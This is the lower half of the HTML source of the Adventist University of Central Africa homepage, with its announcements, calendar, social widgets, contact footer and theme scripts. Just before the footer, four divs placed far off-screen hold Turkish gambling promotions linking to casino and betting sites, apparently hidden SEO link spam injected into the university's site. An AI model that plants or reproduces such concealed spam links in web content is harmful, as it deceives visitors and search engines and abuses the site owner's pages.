                            <div class="widget wpzoom-media-widget widget-none" id="wpzoom-media-widget-4">
                                <div class="post_thumb_withbg" style="background-image:url('https://auca.ac.rw/wp-content/uploads/2019/09/Slider-campus-photo3-710x300-365x240.jpg')">
                                    <a href="https://auca.ac.rw/contact/" target="_blank">
                                        <div class="featured_page_content">
                                            <h3 class="title">Graduate Programmes</h3>
                                        </div>
                                    </a>
                                </div>
                                <div class="clear"></div>
                            </div>
                        </div>
                        <!-- .column -->
                    </section>
                    <div class="column column-narrow">
                        <div class="widget zoom-social-icons-widget widget-none" id="zoom-social-icons-widget-11">
                            <h3 class="title">Follow us</h3>
                            <p class="">Follow us on social media and be the first to find out about our news!</p>
                            <ul class="zoom-social-icons-list zoom-social-icons-list--with-canvas zoom-social-icons-list--round zoom-social-icons-list--no-labels">
                                <li class="zoom-social_icons-list__item">
                                    <a class="zoom-social_icons-list__link" href="https://web.facebook.com/AUCAofficial/?ref=bookmarks&#038;_rdc=1&#038;_rdr" target="_blank" title="Facebook">
                                        <span class="screen-reader-text">facebook</span>
                                        <span class="zoom-social_icons-list-span social-icon socicon socicon-facebook" data-hover-rule="background-color" data-hover-color="#3b5998" style="background-color : #3b5998; font-size: 18px; padding:8px"></span>
                                    </a>
                                </li>
                                <li class="zoom-social_icons-list__item">
                                    <a class="zoom-social_icons-list__link" href="https://twitter.com/AUCA_Rwanda" target="_blank" title="Twitter">
                                        <span class="screen-reader-text">twitter</span>
                                        <span class="zoom-social_icons-list-span social-icon socicon socicon-twitter" data-hover-rule="background-color" data-hover-color="#1da1f2" style="background-color : #1da1f2; font-size: 18px; padding:8px"></span>
                                    </a>
                                </li>
                                <li class="zoom-social_icons-list__item">
                                    <a class="zoom-social_icons-list__link" href="https://www.instagram.com/aucarwanda/" target="_blank" title="Instagram">
                                        <span class="screen-reader-text">instagram</span>
                                        <span class="zoom-social_icons-list-span social-icon socicon socicon-instagram" data-hover-rule="background-color" data-hover-color="#e4405f" style="background-color : #e4405f; font-size: 18px; padding:8px"></span>
                                    </a>
                                </li>
                            </ul>
                            <div class="cleaner">&nbsp;</div>
                        </div>
                        <div class="widget pi_tweet_scroll widget-grey" id="pi_tweet_scroll-2">
                            <h3 class="title">Latest Tweets</h3>
                            <div id="tweets-list-id-349" class="tweets-list-container aside" data-instance-id="2" data-post-id="7282"></div>
                            <script>
                                jQuery(function($) {
                                    /* ================ TWEETS SCROLL ================ */
                                    jQuery('#tweets-list-id-349').tweetscroll({
                                        username: 'AUCA_Rwanda',
                                        time: true,
                                        limit: 15,
                                        speed: 700,
                                        delay: 1000,
                                        animation: 'slide_up',
                                        url_new_window: true,
                                        visible_tweets: 2,
                                        logo: true,
                                        profile_image: true,
                                    });
                                });
                            </script>
                            <div class="cleaner">&nbsp;</div>
                        </div>
                        <div class="widget SP_News_Widget widget-grey" id="sp_news_widget-2">
                            <h3 class="title">ANNOUNCEMENTS</h3>
                            <div class="recent-news-items ">
                                <ul>
                                    <li class="news_li">
                                        <a class="newspost-title" href="https://auca.ac.rw/news/summer-2023-2024-semester-course-schedule-proposal/">Summer 2023-2024 Semester Course Schedule Proposal</a>
                                        <div class="widget-date-post">March 15, 2024							</div>
                                    </li>
                                    <li class="news_li">
                                        <a class="newspost-title" href="https://auca.ac.rw/news/admissions-open-for-june-2024-intake/">Admissions Open for June 2024 Intake</a>
                                        <div class="widget-date-post">March 15, 2024							</div>
                                    </li>
                                    <li class="news_li">
                                        <a class="newspost-title" href="https://auca.ac.rw/news/announcement-concerning-semester-two-registration-2021-2022/">Announcement concerning Semester Two Registration (2021/2022)</a>
                                        <div class="widget-date-post">January 17, 2022							</div>
                                    </li>
                                </ul>
                            </div>
                            <div class="cleaner">&nbsp;</div>
                        </div>
                        <div class="cleaner">&nbsp;</div>
                    </div>
                    <!-- end .column .column-narrow -->
                    <div class="column column-wide column-wide-parent column-last">
                        <div class="column column-wide column-wide-child">
                            <div class="widget widget_text widget-none" id="text-6">
                                <h3 class="title">Welcome to the Adventist University of Central Africa</h3>
                                <div class="textwidget">
                                    <p>
                                        <img decoding="async" class="alignleft size-full wp-image-6194" src="https://new.auca.ac.rw/wp-content/uploads/2019/09/005-G3.jpg" alt="" width="1600" height="1200" srcset="https://auca.ac.rw/wp-content/uploads/2019/09/005-G3.jpg 1600w, https://auca.ac.rw/wp-content/uploads/2019/09/005-G3-300x225.jpg 300w, https://auca.ac.rw/wp-content/uploads/2019/09/005-G3-768x576.jpg 768w, https://auca.ac.rw/wp-content/uploads/2019/09/005-G3-1024x768.jpg 1024w, https://auca.ac.rw/wp-content/uploads/2019/09/005-G3-947x710.jpg 947w, https://auca.ac.rw/wp-content/uploads/2019/09/005-G3-624x468.jpg 624w" sizes="(max-width: 1600px) 100vw, 1600px"/>
                                    </p>
                                    <p>&nbsp;</p>
                                </div>
                                <div class="cleaner">&nbsp;</div>
                            </div>
                            <div class="cleaner">&nbsp;</div>
                        </div>
                        <!-- end .column .column-wide -->
                        <div class="column column-narrow column-narrow-child column-last">
                            <div class="widget widget_calendar widget-blue" id="calendar-2">
                                <h3 class="title">Calendar</h3>
                                <div id="calendar_wrap" class="calendar_wrap">
                                    <table id="wp-calendar" class="wp-calendar-table">
                                        <caption>March 2024</caption>
                                        <thead>
                                            <tr>
                                                <th scope="col" title="Sunday">S</th>
                                                <th scope="col" title="Monday">M</th>
                                                <th scope="col" title="Tuesday">T</th>
                                                <th scope="col" title="Wednesday">W</th>
                                                <th scope="col" title="Thursday">T</th>
                                                <th scope="col" title="Friday">F</th>
                                                <th scope="col" title="Saturday">S</th>
                                            </tr>
                                        </thead>
                                        <tbody>
                                            <tr>
                                                <td colspan="5" class="pad">&nbsp;</td>
                                                <td>1</td>
                                                <td>2</td>
                                            </tr>
                                            <tr>
                                                <td>3</td>
                                                <td>4</td>
                                                <td>5</td>
                                                <td>6</td>
                                                <td>7</td>
                                                <td>8</td>
                                                <td>9</td>
                                            </tr>
                                            <tr>
                                                <td>10</td>
                                                <td>11</td>
                                                <td>12</td>
                                                <td>
                                                    <a href="https://auca.ac.rw/2024/03/13/" aria-label="Posts published on March 13, 2024">13</a>
                                                </td>
                                                <td>14</td>
                                                <td>15</td>
                                                <td>16</td>
                                            </tr>
                                            <tr>
                                                <td>17</td>
                                                <td>18</td>
                                                <td>19</td>
                                                <td>20</td>
                                                <td>21</td>
                                                <td>22</td>
                                                <td>23</td>
                                            </tr>
                                            <tr>
                                                <td>24</td>
                                                <td id="today">25</td>
                                                <td>26</td>
                                                <td>27</td>
                                                <td>28</td>
                                                <td>29</td>
                                                <td>30</td>
                                            </tr>
                                            <tr>
                                                <td>31</td>
                                                <td class="pad" colspan="6">&nbsp;</td>
                                            </tr>
                                        </tbody>
                                    </table>
                                    <nav aria-label="Previous and next months" class="wp-calendar-nav">
                                        <span class="wp-calendar-nav-prev">
                                            <a href="https://auca.ac.rw/2023/01/">&laquo;Jan</a>
                                        </span>
                                        <span class="pad">&nbsp;</span>
                                        <span class="wp-calendar-nav-next">&nbsp;</span>
                                    </nav>
                                </div>
                                <div class="cleaner">&nbsp;</div>
                            </div>
                            <div class="cleaner">&nbsp;</div>
                        </div>
                        <!-- end .column .column-narrow -->
                        <div class="cleaner">&nbsp;</div>
                    </div>
                    <!-- end .column .column-wide -->
                    <div class="cleaner">&nbsp;</div>
                </div>
                <!-- end .wrapper -->
            </div>
            <!-- end #main -->
            <div style="position:absolute;left:-13695px;">
                Bahislerden ve <a href="https://betkanyon-casino.com">Betkanyon</a>
                oyunlardan adrelin yükü alın. Kaydolun ve bir dizi duyguya sahip olun.
            </div>
            <div style="position:absolute;left:-13695px;">
                Etkileyici bir <a href="https://pin-up-casino24.com">Pin up </a>
                eğlence ve bahis seçkisi. İçeri gelin ve benzersiz bonuslar kazanın.
            </div>
            <div style="position:absolute;left:-13695px;">
                Oyun ve spor bahislerinde güvenilir tercihiniz <a href="https://bahsegel-casino.com">Bahsegel</a>
                ile her turda ödüller sizi bekliyor.
            </div>
            <div style="position:absolute;left:-13695px;">
                Oyun oynamak ve bahis yapmak <a href="https://betpercanli.com">Betper</a>
                başarıya ve eğlenceye giden yolunuzdur!
            </div>
            <footer class="site-footer">
                <div class="wrapper">
                    <div class="widget-areas">
                        <div class="column">
                            <div class="widget widget_text widget-blue" id="text-2">
                                <h3 class="title">Since 1984</h3>
                                <div class="textwidget">
                                    <h6>ADVENTIST UNIVERSITY OF CENTRAL AFRICA</h6>
                                    <small>
                                        <em>Masoro Hill, City of Kigali</em>
                                    </small>
                                    <small>
                                        <em></em>
                                    </small>
                                    <p>PO Box 2461, Kigali Rwanda
                                    <p/>
                                    <small></small>
                                    <p>Admission Inquiries: admissions@auca.ac.rw or call +250 724796998
                                    <p/>
                                    <p>Media Inquiries: marketing@auca.ac.rw
                                    <p/>
                                    <p>General Inquiries: info@auca.ac.rw
                                    <p/>
                                </div>
                                <div class="cleaner">&nbsp;</div>
                            </div>
                            <div class="cleaner">&nbsp;</div>
                        </div>
                        <!-- end .column -->
                        <div class="column">
                            <div class="cleaner">&nbsp;</div>
                        </div>
                        <!-- end .column -->
                        <div class="column">
                            <div class="widget zoom-social-icons-widget widget-none" id="zoom-social-icons-widget-10">
                                <h3 class="title">Follow us</h3>
                                <ul class="zoom-social-icons-list zoom-social-icons-list--with-canvas zoom-social-icons-list--round">
                                    <li class="zoom-social_icons-list__item">
                                        <a class="zoom-social_icons-list__link" href="http://gbaziramwabo@gmail.com%20" target="_blank" title="Facebook">
                                            <span class="zoom-social_icons-list-span social-icon socicon socicon-facebook" data-hover-rule="background-color" data-hover-color="#3b5998" style="background-color : #3b5998; font-size: 18px; padding:8px"></span>
                                            <span class="zoom-social_icons-list__label">Facebook</span>
                                        </a>
                                    </li>
                                    <li class="zoom-social_icons-list__item">
                                        <a class="zoom-social_icons-list__link" href="https://twitter.com/AUCA_Rwanda" target="_blank" title="Twitter">
                                            <span class="zoom-social_icons-list-span social-icon socicon socicon-twitter" data-hover-rule="background-color" data-hover-color="#1da1f2" style="background-color : #1da1f2; font-size: 18px; padding:8px"></span>
                                            <span class="zoom-social_icons-list__label">Twitter</span>
                                        </a>
                                    </li>
                                    <li class="zoom-social_icons-list__item">
                                        <a class="zoom-social_icons-list__link" href="https://www.instagram.com/aucarwanda/" target="_blank" title="Instagram">
                                            <span class="zoom-social_icons-list-span social-icon socicon socicon-instagram" data-hover-rule="background-color" data-hover-color="#e4405f" style="background-color : #e4405f; font-size: 18px; padding:8px"></span>
                                            <span class="zoom-social_icons-list__label">Instagram</span>
                                        </a>
                                    </li>
                                </ul>
                                <div class="cleaner">&nbsp;</div>
                            </div>
                            <div class="cleaner">&nbsp;</div>
                        </div>
                        <!-- end .column -->
                        <div class="column">
                            <div class="widget_text widget widget_custom_html widget-none" id="custom_html-2">
                                <h3 class="title">LOCATION</h3>
                                <div class="textwidget custom-html-widget">
                                    <iframe style="border: 0;" src="https://www.google.com/maps/embed?pb=!1m14!1m8!1m3!1d15950.07679966865!2d30.1430941!3d-1.9451934!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x0%3A0x39b5394a977ee4a1!2sAdventist%20University%20of%20Central%20Africa!5e0!3m2!1sen!2srw!4v1568830814427!5m2!1sen!2srw" width="300" height="220" frameborder="0" allowfullscreen="allowfullscreen"></iframe>
                                </div>
                                <div class="cleaner">&nbsp;</div>
                            </div>
                            <div class="cleaner">&nbsp;</div>
                        </div>
                        <!-- end .column -->
                    </div>
                    <div class="cleaner">&nbsp;</div>
                </div>
                <!-- end .wrapper -->
            </footer>
            <div id="footer-copy">
                <div class="wrapper wrapper-copy">
                    <p class="copyright">Copyright © 2024 Adventist University of Central Africa. All Rights Reserved</p>
                    <div class="cleaner">&nbsp;</div>
                </div>
                <!-- end .wrapper .wrapper-copy -->
            </div>
            <!-- end #footer-copy -->
        </div>
        <!-- end #container -->
        <script>
            (function(d, s, id) {
                var js, fjs = d.getElementsByTagName(s)[0];
                js = d.createElement(s);
                js.id = id;
                js.src = 'https://connect.facebook.net/en_US/sdk/xfbml.customerchat.js#xfbml=1&version=v6.0&autoLogAppEvents=1'
                fjs.parentNode.insertBefore(js, fjs);
            }(document, 'script', 'facebook-jssdk'));
        </script>
        <div class="fb-customerchat" attribution="wordpress" attribution_version="2.3" page_id="234659243663530"></div>
        <script type="text/javascript" src="https://auca.ac.rw/wp-includes/js/comment-reply.min.js?ver=6.4.3" id="comment-reply-js" async="async" data-wp-strategy="async"></script>
        <script type="text/javascript" src="https://auca.ac.rw/wp-content/themes/academica_pro_3/js/jquery.slicknav.min.js?ver=3.0.19" id="slicknav-js"></script>
        <script type="text/javascript" src="https://auca.ac.rw/wp-content/themes/academica_pro_3/js/dropdown.js?ver=3.0.19" id="superfish-js"></script>
        <script type="text/javascript" src="https://auca.ac.rw/wp-content/themes/academica_pro_3/js/flickity.pkgd.min.js?ver=3.0.19" id="flickity-js"></script>
        <script type="text/javascript" src="https://auca.ac.rw/wp-content/themes/academica_pro_3/js/jquery.fitvids.js?ver=3.0.19" id="fitvids-js"></script>
        <script type="text/javascript" src="https://auca.ac.rw/wp-content/themes/academica_pro_3/js/search_button.js?ver=3.0.19" id="search_button-js"></script>
        <script type="text/javascript" id="academica-pro-script-js-extra">
            /* <![CDATA[ */
            var zoomOptions = {
                "slideshow_auto": "1",
                "slideshow_speed": "3000"
            };
            /* ]]> */
        </script>
        <script type="text/javascript" src="https://auca.ac.rw/wp-content/themes/academica_pro_3/js/functions.js?ver=3.0.19" id="academica-pro-script-js"></script>
        <script type="text/javascript" src="https://auca.ac.rw/wp-content/plugins/social-icons-widget-by-wpzoom/assets/js/social-icons-widget-frontend.js?ver=1709814992" id="zoom-social-icons-widget-frontend-js"></script>
    </body>
</html>
